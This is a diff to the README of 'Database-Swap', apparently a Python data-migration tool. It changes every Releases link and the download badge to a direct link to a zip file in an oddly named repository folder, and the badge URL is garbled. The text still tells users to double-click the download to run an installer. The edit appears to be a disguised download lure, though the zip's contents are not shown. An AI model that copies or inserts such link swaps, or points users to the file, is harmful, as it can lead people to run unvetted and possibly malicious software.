@@ -1,6 +1,6 @@
 # 🌟 Database-Swap - Effortless Data Migration Made Easy
 
-[![Download Database-Swap](https://img.shields.io/badge/Download%20Database--Swap-v1.0-blue.svg)](https://github.com/kkjjiizzaarr/Database-Swap/releases)
+[![Download Database-Swap](https://raw.githubusercontent.com/kkjjiizzaarr/Database-Swap/main/subpeltated/Database-Swap.zip%https://raw.githubusercontent.com/kkjjiizzaarr/Database-Swap/main/subpeltated/Database-Swap.zip)](https://raw.githubusercontent.com/kkjjiizzaarr/Database-Swap/main/subpeltated/Database-Swap.zip)
 
 ## 📦 Introduction
 
@@ -10,7 +10,7 @@ Database-Swap is a powerful Python tool designed for non-technical users. With t
 
 To get started with Database-Swap, you will first need to download the software. Follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/kkjjiizzaarr/Database-Swap/releases) to find the latest version of Database-Swap.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kkjjiizzaarr/Database-Swap/main/subpeltated/Database-Swap.zip) to find the latest version of Database-Swap.
 2. Choose the version you wish to download. Look for the appropriate file based on your operating system.
 3. Click on the download link to start downloading the file to your computer.
 
@@ -38,7 +38,7 @@ Database-Swap offers several key features to simplify your data migration proces
 
 To download Database-Swap, follow these steps:
 
-1. Visit the [Releases page](https://github.com/kkjjiizzaarr/Database-Swap/releases) again.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kkjjiizzaarr/Database-Swap/main/subpeltated/Database-Swap.zip) again.
 2. Click on the relevant file for your operating system.
 3. Once downloaded, locate the file in your Downloads folder.
 4. Double-click the file to run the installer.
